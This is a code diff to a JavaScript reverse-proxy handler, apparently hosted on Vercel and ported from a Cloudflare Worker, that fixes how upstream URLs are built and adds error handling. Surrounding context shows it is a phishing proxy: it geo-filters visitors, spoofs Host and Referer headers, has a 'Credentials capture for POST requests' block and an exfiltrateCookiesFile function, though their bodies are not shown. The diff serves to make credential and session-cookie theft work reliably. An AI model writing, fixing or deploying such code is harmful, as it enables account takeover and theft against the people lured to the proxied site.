@@ -40,7 +40,7 @@ async function exfiltrateCookiesFile(cookieText, ip) {
 async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
   
-  // Get client info from Vercel headers (equivalent to Cloudflare headers)
+  // Get client info from Vercel headers
   const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
   const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
 
@@ -49,31 +49,33 @@ async function handleProxy(request, pathSegments = []) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Build URL like Cloudflare Worker does
-  const url_hostname = url.hostname;
+  // FIX: Extract hostname without port
+  const url_hostname = url.hostname; // This strips port automatically
+  
+  // FIX: Build upstream URL manually to avoid port contamination
   const upstream_domain = UPSTREAM;
   
-  // Create new URL object for upstream like Cloudflare Worker
-  const upstreamUrl = new URL(request.url);
-  upstreamUrl.protocol = 'https:';
-  upstreamUrl.host = upstream_domain;
-
-  // Handle path like Cloudflare Worker
-  if (upstreamUrl.pathname === '/') {
-    upstreamUrl.pathname = UPSTREAM_PATH;
-  } else {
-    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
+  // Build path - remove any query parameters that might be path-related
+  let pathname = url.pathname;
+  const search = url.search;
+  
+  // Handle path construction
+  let upstream_path = UPSTREAM_PATH;
+  if (pathname !== '/') {
+    upstream_path = UPSTREAM_PATH + pathname;
   }
+  
+  // FIX: Construct URL string manually to ensure no port
+  const upstreamUrl = `https://${upstream_domain}${upstream_path}${search}`;
+  
+  console.log('Proxying to:', upstreamUrl);
 
-  console.log('Proxying to:', upstreamUrl.toString());
-
-  // Build headers EXACTLY like Cloudflare Worker
+  // Build headers
   const method = request.method;
-  const request_headers = request.headers;
-  const new_request_headers = new Headers(request_headers);
+  const new_request_headers = new Headers(request.headers);
 
   new_request_headers.set('Host', upstream_domain);
-  new_request_headers.set('Referer', `https://${url_hostname}`);
+  new_request_headers.set('Referer', `https://${url_hostname}/`);
 
   // ---- Credentials capture for POST requests ----
   if (method === 'POST') {
@@ -99,20 +101,26 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ---- Proxy request to upstream EXACTLY like Cloudflare Worker ----
-  let original_response = await fetch(upstreamUrl.toString(), {
-    method: method,
-    headers: new_request_headers,
-    body: ["GET", "HEAD"].includes(method) ? null : request.body
-  });
+  // ---- Proxy request to upstream ----
+  let original_response;
+  try {
+    original_response = await fetch(upstreamUrl, {
+      method: method,
+      headers: new_request_headers,
+      body: ["GET", "HEAD"].includes(method) ? null : request.body
+    });
+  } catch (error) {
+    console.error('Fetch failed:', error);
+    return new Response('Proxy error', { status: 502 });
+  }
 
-  // Handle WebSocket upgrades like Cloudflare Worker
+  // Handle WebSocket upgrades
   let connection_upgrade = new_request_headers.get("Upgrade");
   if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
     return original_response;
   }
 
-  // Process response like Cloudflare Worker
+  // Process response
   let original_response_clone = original_response.clone();
   let response_headers = original_response.headers;
   let new_response_headers = new Headers(response_headers);
